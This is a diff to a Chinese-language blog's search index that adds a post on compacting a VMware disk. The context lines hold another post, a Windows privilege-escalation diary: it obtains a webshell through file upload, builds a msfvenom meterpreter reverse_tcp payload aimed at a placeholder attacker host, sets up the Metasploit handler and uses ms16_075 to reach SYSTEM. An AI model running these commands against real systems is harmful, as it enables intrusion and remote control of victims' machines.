@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[VMware虚拟机导出压缩]]></title>
+    <url>%2F2019%2F07%2F11%2FVMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AF%BC%E5%87%BA%E5%8E%8B%E7%BC%A9%2F</url>
+    <content type="text"><![CDATA[先清理系统垃圾文件比如有安装nessus，先删除其插件备份文件：rm /opt/nessus/var/nessus/plugins-code.db.1555813621612956655rm /opt/nessus/var/nessus/plugins-desc.db.15558136311650186018 然后清理swap文件：先执行sync命令，sync命令用于强制被改变的内容立刻写入磁盘，更新超块信息，以防止释放，sync命令则可用来强制将内存缓冲区中的数据立即写入磁盘中。sync关闭swap：swapoff -a 压缩虚拟机磁盘空间先填充虚拟机磁盘：cat /dev/zero &gt; zero.fill;sync;sleep 1;sync;rm -f zero.fill 使用vm磁盘工具压缩空间 vmware-vdiskmanager.exe -k &quot;G:\vmfiles\Pentest_Linux\Nessus 8_VM12-disk1-cl1.vmdk&quot; 导出为ovf文件]]></content>
+      <categories>
+        <category>折腾</category>
+      </categories>
+  </entry>
+  <entry>
     <title><![CDATA[记一次Windows提权过程]]></title>
     <url>%2F2019%2F07%2F10%2F%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B%2F</url>
     <content type="text"><![CDATA[通过任意文件上传获取到ASP webshell 生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe 启动监听use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST x.x.x.x set LPORT xx exploit 通过webshell上传并执行木马 msf接收到会话 查看当前用户getuid use incognito list_tokens -u 查找可利用的提权exprun post/multi/recon/local_exploit_suggester 把当前msf回话放到后台，并记住其session值为5bg 利用ms16_075得到system权限]]></content>
